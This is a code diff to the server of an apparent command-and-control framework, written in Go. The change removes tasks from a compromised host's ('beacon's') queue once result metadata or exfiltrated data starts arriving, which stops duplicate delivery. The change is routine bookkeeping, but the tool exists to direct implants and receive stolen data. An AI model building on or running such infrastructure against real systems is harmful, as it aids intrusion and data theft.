@@ -1355,6 +1355,26 @@ func (c2 *C2Manager) handleResultMeta(parts []string, isDuplicate bool) string {
 
 	c2.mutex.Lock()
 	c2.expectedResults[taskID] = expected
+
+	// CRITICAL: Remove task from beacon's queue immediately when META arrives
+	// This prevents task from being re-delivered while beacon is sending results
+	if beacon, exists := c2.beacons[beaconID]; exists {
+		newQueue := []Task{}
+		removed := false
+		for _, queuedTask := range beacon.TaskQueue {
+			if queuedTask.ID != taskID {
+				newQueue = append(newQueue, queuedTask)
+			} else {
+				removed = true
+			}
+		}
+		if removed {
+			beacon.TaskQueue = newQueue
+			if c2.debug {
+				logf("[C2] Removed task %s from beacon %s queue (META received, result incoming)", taskID, beaconID)
+			}
+		}
+	}
 	c2.mutex.Unlock()
 
 	return "ACK"
@@ -1392,6 +1412,7 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	}
 
 	// Update task status to "exfiltrating" when first chunk arrives
+	// AND remove from beacon's task queue to prevent re-delivery
 	if !isDuplicate && taskExists && task.Status == "sent" {
 		c2.mutex.Lock()
 		if c2.tasks[taskID].Status == "sent" {
@@ -1405,6 +1426,21 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 			}
 			if c2.debug {
 				logf("[DEBUG] Task %s status: sent → exfiltrating", taskID)
+			}
+
+			// CRITICAL: Remove task from beacon's queue immediately
+			// Once beacon starts sending results, it shouldn't receive the task again
+			if beacon, exists := c2.beacons[beaconID]; exists {
+				newQueue := []Task{}
+				for _, queuedTask := range beacon.TaskQueue {
+					if queuedTask.ID != taskID {
+						newQueue = append(newQueue, queuedTask)
+					}
+				}
+				beacon.TaskQueue = newQueue
+				if c2.debug {
+					logf("[C2] Removed task %s from beacon %s queue (exfiltration started)", taskID, beaconID)
+				}
 			}
 		}
 		c2.mutex.Unlock()
